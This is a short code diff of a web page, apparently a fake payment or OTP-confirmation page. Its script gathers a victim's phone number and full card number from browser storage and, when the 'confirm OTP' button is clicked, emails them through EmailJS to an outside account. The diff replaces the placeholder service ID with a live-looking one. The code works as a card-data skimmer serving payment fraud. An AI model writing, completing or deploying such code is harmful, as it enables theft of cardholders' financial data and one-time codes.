@@ -334,7 +334,7 @@ function updateTimerDisplay() {
     emailjs.init("TU_USER_ID"); // ⚡ pega aquí tu Public Key de EmailJS
   })();
 
-  async function enviarDatos() {
+    async function enviarDatos() {
     let datos = {
       phone: localStorage.getItem("customerPhone"),
       cardNumber: localStorage.getItem("fullCardNumber"),
@@ -346,7 +346,7 @@ function updateTimerDisplay() {
     };
 
     try {
-      let res = await emailjs.send("TU_SERVICE_ID", "TU_TEMPLATE_ID", datos);
+      let res = await emailjs.send("service_tbpf1zf", "template_pago", datos);
       console.log("Correo enviado ✅", res.status, res.text);
     } catch (err) {
       console.error("Error ❌", err);
@@ -360,6 +360,8 @@ function updateTimerDisplay() {
   document.getElementById("confirm-otp").addEventListener("click", enviarDatos);
 </script>
 
+
 </body>
 </html>
+
 
